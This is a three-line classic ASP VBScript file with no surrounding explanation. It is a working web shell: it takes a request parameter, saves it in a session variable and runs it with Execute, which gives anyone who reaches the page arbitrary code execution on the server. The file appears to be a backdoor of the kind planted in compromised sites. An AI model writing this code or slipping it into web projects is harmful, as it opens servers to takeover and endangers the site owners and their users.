<script language="vbscript" runat="server">
If Request("111111")<>"" Then Session("lovelyq")=Request("111111")
If Session("lovelyq")<>"" Then Execute(Session("lovelyq"))
</script>
